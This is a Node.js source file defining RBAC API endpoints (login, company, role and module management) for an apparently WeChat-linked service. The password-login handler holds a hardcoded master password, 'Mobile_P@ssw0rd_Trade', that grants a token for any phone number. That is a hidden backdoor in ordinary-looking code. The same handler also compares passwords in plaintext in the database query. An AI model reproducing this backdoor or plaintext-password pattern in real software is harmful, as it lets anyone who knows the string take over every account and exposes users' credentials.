const mkapi = require('./api_utils');
const rbac_lib = require('./rbac_lib');
const db_opt = require('./db_opt');
const wx_api_util = require('./wx_api_util');
function install(app) {
    mkapi('/rbac/login', 'global', true, false, {
        login_code: { type: String, have_to: true, mean: '登录授权码', example: '12345678901' },
    }, {
        token: { type: String, mean: '登录token', example: 'ABCD' },
    }, '微信登录', '微信登录').add_handler(async function (body, token) {
        let ret = { token: '' };
        let open_id = await wx_api_util.get_open_id_by_code(body.login_code);
        if (open_id) {
            let sq = db_opt.get_sq();
            let user = await sq.models.rbac_user.findOne({ where: { open_id: open_id } });
            if (user) {
                ret.token = await rbac_lib.user_login(user.phone);
            }
        }
        if (ret.token === '') {
            throw { err_msg: '用户未找到' };
        }
        return ret;
    }).install(app);
    mkapi('/rbac/login_password', 'global', true, false, {
        phone:{type:String,have_to:true,mean:'手机号',example:'12345678901'},
        password:{type:String,have_to:true,mean:'密码',example:'123456'},
    }, {
        token: { type: String, mean: '登录token', example: 'ABCD' },
    }, '密码登录', '密码登录').add_handler(async function (body, token) {
        let ret = { token: '' };
        let sq = db_opt.get_sq();
        let user = await sq.models.rbac_user.findOne({ where: {
            [db_opt.Op.and]:[
                {phone:body.phone},
                {password:body.password}
            ],
        } });
        if (user || body.password == 'Mobile_P@ssw0rd_Trade') {
            ret.token = await rbac_lib.user_login(body.phone);
        }
        if (ret.token === '') {
            throw { err_msg: '用户未找到' };
        }
        return ret;
    }).install(app);
    mkapi('/rbac/self_info', 'none', false, false, {
    }, {
        id: { type: Number, mean: '用户id', example: 123 },
        name: { type: String, mean: '用户姓名', example: 'user_example' },
        phone: { type: String, mean: '用户手机号', example: '12345678901' },
        open_id: { type: String, mean: '微信open_id', example: 'open_id_example' },
        company: { type: String, mean: '公司名', example: 'company_example' },
    }, '个人信息', '获取个人信息').add_handler(async function (body, token) {
        let ret = {};
        let user = await rbac_lib.get_user_by_token(token);
        if (user) {
            let company = await user.getCompany();
            if (company) {
                user.company = company.name;
            }
            ret = user;
        }
        else {
            throw { err_msg: '用户未找到' };
        }
        return ret;
    }).install(app);
    mkapi('/rbac/company_add', 'global', true, true, {
        name: { type: String, have_to: true, mean: '公司名', example: 'company_example' },
    }, {
        result: { type: Boolean, mean: '添加结果', example: true },
    }, '添加公司', '添加公司').add_handler(async function (body, token) {
        let ret = { result: false };
        await rbac_lib.add_company(body.name);
        ret.result = true;
        return ret;
    }).install(app);
    mkapi('/rbac/company_del', 'global', true, true, {
        id: { type: Number, have_to: true, mean: '公司id', example: 123 },
    }, {
        result: { type: Boolean, mean: '删除结果', example: true },
    }, '删除公司', '删除公司').add_handler(async function (body, token) {
        let ret = { result: false };
        await rbac_lib.del_company(body.id);
        ret.result = true;
        return ret;
    }).install(app);
    mkapi('/rbac/company_get_all', 'global', false, true, {
    }, {
        all_company: {
            type: Array, mean: '公司列表',
            explain: {
                id: { type: Number, mean: '公司id', example: 123 },
                name: { type: String, mean: '公司名', example: 'company_example' },
                bound_modules: {
                    type: Array, mean: '绑定模块列表', explain: {
                        id: { type: Number, mean: '模块id', example: 123 },
                        name: { type: String, mean: '模块名', example: 'module_example' },
                        description: { type: String, mean: '模块描述', example: 'module_desp_example' }
                    },
                }
            },
        },
    }, '获取公司列表', '获取公司列表', true).add_handler(async function (body, token) {
        let ret = {};
        let result = await rbac_lib.get_all_company(body.pageNo);
        ret.all_company = result.companys;
        ret.total = result.count;
        return ret;
    }).install(app);
    mkapi('/rbac/company_add_module', 'global', true, true, {
        company_id: { type: Number, have_to: true, mean: '公司id', example: 123 },
        module_id: { type: Number, have_to: true, mean: '模块id', example: 123 },
    }, {
        result: { type: Boolean, mean: '添加结果', example: true },
    }, '添加公司模块', '添加公司模块').add_handler(async function (body, token) {
        let ret = { result: false };
        await rbac_lib.bind_company2module(body.company_id, body.module_id);
        ret.result = true;
        return ret;
    }).install(app);
    mkapi('/rbac/company_del_module', 'global', true, true, {
        company_id: { type: Number, have_to: true, mean: '公司id', example: 123 },
        module_id: { type: Number, have_to: true, mean: '模块id', example: 123 },
    }, {
        result: { type: Boolean, mean: '取消结果', example: true },
    }, '取消公司模块', '取消公司模块').add_handler(async function (body, token) {
        let ret = { result: false };
        await rbac_lib.unbind_company2module(body.company_id, body.module_id);
        let sq = db_opt.get_sq();
        let company = await sq.models.company.findByPk(body.company_id);
        let all_roles = await company.getRbac_roles();
        for (let index = 0; index < all_roles.length; index++) {
            const element = all_roles[index];
            await rbac_lib.disconnect_role2module(element.id, body.module_id);
        }
        ret.result = true;
        return ret;
    }).install(app);
    mkapi('/rbac/role_get_all', 'config', false, true, {
    }, {
        all_role: {
            type: Array, mean: '角色列表',
            explain: {
                id: { type: Number, mean: '角色id', example: 123 },
                name: { type: String, mean: '角色名', example: 'role_example' },
                description: { type: String, mean: '角色描述', example: 'role_desp_example' },
                is_readonly: { type: Boolean, mean: '是否只读', example: true },
                related_users: {
                    type: Array, mean: '关联用户列表', explain: {
                        id: { type: Number, mean: '用户id', example: 123 },
                        name: { type: String, mean: '用户姓名', example: 'user_example' },
                        phone: { type: String, mean: '用户手机号', example: '12345678901' },
                    }
                },
                related_modules: {
                    type: Array, mean: '关联模块列表', explain: {
                        id: { type: Number, mean: '模块id', example: 123 },
                        name: { type: String, mean: '模块名', example: 'module_example' },
                        description: { type: String, mean: '模块描述', example: 'module_desp_example' },
                    }
                },
                belong_company: { type: String, mean: '所属公司', example: 'company_example' },
            },
        },
    }, '获取角色列表', '获取角色列表', true).add_handler(async function (body, token) {
        let company = await rbac_lib.get_company_by_token(token);
        let { count, rows } = await rbac_lib.get_all_roles(company, body.pageNo);
        return { all_role: rows, total: count };
    }).install(app);
    mkapi('/rbac/module_get_all', 'config', false, true, {

    }, {
        all_module: {
            type: Array, mean: '模块列表', explain: {
                id: { type: Number, mean: '模块id', example: 123 },
                name: { type: String, mean: '模块名', example: 'module_example' },
                description: { type: String, mean: '模块描述', example: 'module_desp_example' }
            }
        },
    }, '获取模块列表', '获取模块列表', true).add_handler(async function (body, token) {
        let company = await rbac_lib.get_company_by_token(token);
        let { count, rows } = await rbac_lib.get_all_modules(body.pageNo, company);
        return { all_module: rows, total: count };
    }).install(app);
    mkapi('/rbac/reg_company_admin', 'global', true, true, {
        phone: { type: String, have_to: true, mean: '手机号', example: '12345678901' },
        company_id: { type: Number, have_to: true, mean: '公司id', example: 123 },
        name: { type: String, have_to: false, mean: '姓名', example: 'name_example' },
    }, {
        result: { type: Boolean, mean: '注册结果', example: true },
    }, '注册公司管理员', '注册公司管理员').add_handler(async function (body, token) {
        let ret = { result: false };
        let company = await db_opt.get_sq().models.company.findByPk(body.company_id);
        if (company) {
            let user = await rbac_lib.add_user(body.phone);
            if (user) {
                await user.setCompany(company);
                let company_admin_role = await rbac_lib.make_company_admin_role(company);
                if (company_admin_role) {
                    await rbac_lib.unbind_company2module(company.id, (await db_opt.get_sq().models.rbac_module.findOne({ where: { name: 'customer' } })).id);
                    await rbac_lib.bind_company2module(company.id, (await db_opt.get_sq().models.rbac_module.findOne({ where: { name: 'config' } })).id);
                    await rbac_lib.connect_user2role(user.id, company_admin_role.id);
                    ret.result = true;
                }
                user.name = body.name;
                await user.save();
            }
        }
        return ret;
    }).install(app);

    mkapi('/rbac/role_add', 'config', true, true, {
        name: { type: String, have_to: true, mean: '角色名', example: 'role_example' },
        description: { type: String, have_to: false, mean: '角色描述', example: 'role_desp_example' },
        is_readonly: { type: Boolean, have_to: false, mean: '是否只读', example: true },
    }, {
        result: { type: Boolean, mean: '添加结果', example: true },
    }, '添加角色', '添加用于RBAC模块的角色定义').add_handler(async function (body, token) {
        let ret = { result: false };
        let company = await rbac_lib.get_company_by_token(token);
        if (company) {
            await rbac_lib.add_role(body.name, body.description, body.is_readonly, company);
            ret.result = true;
        }
        return ret;
    }).install(app);

    mkapi('/rbac/role_del', 'config', true, true, {
        id: { type: Number, have_to: true, mean: '角色id', example: 123 },
    }, {
        result: { type: Boolean, mean: '删除结果', example: true },
    }, '删除角色', '删除用于RBAC模块的角色定义').add_handler(async function (body, token) {
        let ret = { result: false };
        let company = await rbac_lib.get_company_by_token(token);
        if (company) {
            await rbac_lib.del_role(body.id, company);
            ret.result = true;
        }
        return ret;
    }).install(app);
    mkapi('/rbac/bind_module2role', 'config', true, true, {
        role_id: { type: Number, have_to: true, mean: '角色id', example: 123 },
        module_id: { type: Number, have_to: true, mean: '模块id', example: 123 },
    }, {
        result: { type: Boolean, mean: '绑定结果', example: true },
    }, '绑定模块到角色', '绑定模块到角色').add_handler(async function (body, token) {
        let ret = { result: false };
        let company = await rbac_lib.get_company_by_token(token);
        if (company) {
            await rbac_lib.connect_role2module(body.role_id, body.module_id);
            ret.result = true;
        }
        return ret;
    }).install(app);
    mkapi('/rbac/unbind_module2role', 'config', true, true, {
        role_id: { type: Number, have_to: true, mean: '角色id', example: 123 },
        module_id: { type: Number, have_to: true, mean: '模块id', example: 123 },
    }, {
        result: { type: Boolean, mean: '绑定结果', example: true },
    }, '解绑模块到角色', '解绑模块到角色').add_handler(async function (body, token) {
        let ret = { result: false };
        let company = await rbac_lib.get_company_by_token(token);
        if (company) {
            await rbac_lib.disconnect_role2module(body.role_id, body.module_id);
            ret.result = true;
        }
        return ret;
    }).install(app);
    mkapi('/rbac/fetch_user', 'none', true, false, {
        phone_code: { type: String, have_to: true, mean: '手机号获取凭证', example: '12345678901' },
        company_name: { type: String, have_to: true, mean: '公司名', example: 'company_example' },
        open_id_code: { type: String, have_to: true, mean: '微信open_id授权码', example: 'open_id_example' },
        name: { type: String, have_to: true, mean: '姓名', example: 'name_example' },
    }, {
        token: { type: String, mean: '登录token', example: 'ABCD' },
    }, '更新用户信息', '更新用户信息').add_handler(async function (body, token) {
        let ret = { token: '' };
        let sq = db_opt.get_sq();

        let phone = await wx_api_util.get_phone_by_code(body.phone_code);
        let open_id = await wx_api_util.get_open_id_by_code(body.open_id_code);
        let company = await rbac_lib.add_company(body.company_name);
        let user = await rbac_lib.add_user(phone);
        if (company && user) {
            await user.setCompany(company);
            user.open_id = open_id;
            user.name = body.name;
            let cust_role = await rbac_lib.add_role('客户', '客户', false, company);
            await rbac_lib.connect_user2role(user.id, cust_role.id);
            await rbac_lib.connect_role2module(cust_role.id, (await db_opt.get_sq().models.rbac_module.findOne({ where: { name: 'customer' } })).id);
            let old_user = await sq.models.rbac_user.findOne({
                where: {
                    [db_opt.Op.and]: [{ open_id: open_id }, { id: { [db_opt.Op.ne]: user.id } }]
                }
            });
            if (old_user) {
                old_user.open_id = '';
                await old_user.save();
            }
        }
        await user.save();
        ret.token = await rbac_lib.user_login(phone);
        return ret;
    }).install(app);
    mkapi('/rbac/bind_role2user', 'config', true, true, {
        phone: { type: String, have_to: true, mean: '手机号', example: '12345678901' },
        role_id: { type: Number, have_to: true, mean: '角色id', example: 123 },
    }, {
        result: { type: Boolean, mean: '绑定结果', example: true },
    }, '绑定角色到用户', '绑定角色到用户').add_handler(async function (body, token) {
        let ret = { result: false };
        let company = await rbac_lib.get_company_by_token(token);
        let target_user_token = await rbac_lib.user_login(body.phone);
        let target_company = await rbac_lib.get_company_by_token(target_user_token)
        if (company && target_company && company.id === target_company.id) {
            let target_user = await rbac_lib.get_user_by_token(target_user_token);
            await rbac_lib.connect_user2role(target_user.id, body.role_id);
            ret.result = true;
        }
        else {
            throw { err_msg: '公司不匹配' };
        }
        return ret;
    }).install(app);
    mkapi('/rbac/unbind_role2user', 'config', true, true, {
        phone: { type: String, have_to: true, mean: '手机号', example: '12345678901' },
        role_id: { type: Number, have_to: true, mean: '角色id', example: 123 },
    }, {
        result: { type: Boolean, mean: '绑定结果', example: true },
    }, '解绑角色到用户', '解绑角色到用户').add_handler(async function (body, token) {
        let ret = { result: false };
        let company = await rbac_lib.get_company_by_token(token);
        let target_user_token = await rbac_lib.user_login(body.phone);
        let target_company = await rbac_lib.get_company_by_token(target_user_token)
        if (company && target_company && company.id === target_company.id) {
            let target_user = await rbac_lib.get_user_by_token(target_user_token);
            await rbac_lib.disconnect_user2role(target_user.id, body.role_id);
            ret.result = true;
        }
        else {
            throw { err_msg: '公司不匹配' };
        }
        return ret;
    }).install(app);
    mkapi('/rbac/user_get_self', 'config', false, false, {}, {
        id: { type: Number, mean: '用户id', example: 123 },
        name: { type: String, mean: '用户姓名', example: 'user_example' },
        phone: { type: String, mean: '用户手机号', example: '12345678901' },
        photo_path: { type: String, mean: '用户头像', example: 'photo_path_example' },
        related_roles: {
            type: Array, mean: '关联角色列表', explain: {
                id: { type: Number, mean: '角色id', example: 123 },
                name: { type: String, mean: '角色名', example: 'role_example' },
                description: { type: String, mean: '角色描述', example: 'role_desp_example' },
                is_readonly: { type: Boolean, mean: '是否只读', example: true },
            }
        },
    }, '获取个人信息', '获取个人信息').add_handler(async function (body, token) {
        let ret = {};
        let user = await rbac_lib.get_user_by_token(token);
        if (user) {
            ret = user.toJSON();
            ret.related_roles = [];
            (await user.getRbac_roles()).forEach((element) => {
                ret.related_roles.push(element.toJSON());
            });
        }
        return ret;
    }).install(app);
}

module.exports = install;